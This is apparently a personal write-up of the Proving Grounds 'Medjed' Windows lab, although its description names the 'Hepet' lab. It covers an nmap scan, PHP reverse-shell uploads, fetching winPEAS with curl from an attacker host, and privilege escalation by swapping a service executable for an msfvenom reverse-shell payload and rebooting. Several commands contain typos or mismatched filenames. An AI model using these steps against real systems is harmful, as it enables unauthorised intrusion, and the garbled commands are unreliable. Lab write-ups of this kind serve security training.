---
title: Medjed
date: 2026-01-19T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - proving-grounds
  - webdav
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hepet"
---
nmap -p- -v 192.168.158.127 --min-rate 5000

![](Screenshot%202026-01-15%20at%2008.33.35.png)

First thing is to check out this port 8000 website

![](Screenshot%202026-01-15%20at%2008.36.05.png)

After setting an admin password take a look around the site. Eventually you'll come across this file server link:

![](Screenshot%202026-01-16%20at%2008.32.25.png)

![](Screenshot%202026-01-16%20at%2008.34.09.png)

I tried to upload a file to the server then navigate to it but I wasn't able to use the url path to execute the reverse shell. Eventually I figured out that there is a quiz website you can  leverage on port 45443. 

![](Screenshot%202026-01-16%20at%2008.39.59.png)

At first I tried the Pentest-monkey php script from revshells.com, when that failed I tried Ivan Sincek's php script. These were uploaded to the root folder of the quiz site. 

`C:\xampp\htdocs`

![](Screenshot%202026-01-16%20at%2008.40.31.png)

![](Screenshot%202026-01-16%20at%2008.44.01.png)

![](Screenshot%202026-01-16%20at%2008.38.37.png)

Move Winpeas over and run it:

`winpeas`

`rlwrap nc -lvnp 81`

Victim:

`curl http://192.168.45.169/:81winPEASany.exe -o wimp.exe`

![](Screenshot%202026-01-16%20at%2008.50.25.png)

Earlier I found this 

![](Screenshot%202026-01-16%20at%2008.55.59.png)![](Screenshot%202026-01-16%20at%2008.58.55.png)

![](Screenshot%202026-01-16%20at%2009.09.21.png)

This shows that the service will auto start on reset, the folder has writeable permissions and the name of the *exe* file.

Create a msfvenom payload that has the same name as the executable:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=1234 -f exe -o bd.exe`

`python http.server 81`

On the victim machine:

`cd /`

`cd bd`
	
`move bd.exe bd.exe.bak`

`curl http://192.168.45.168:81/bc64.exe -o bc.exe` 

Start your nc server on the attack machine:

`rlwrap nc -lmvp 1234

Now reboot the victim machine:

`shutdown /r /t 0

![](Screenshot%202026-01-16%20at%2012.38.51.png)

6.5 hours

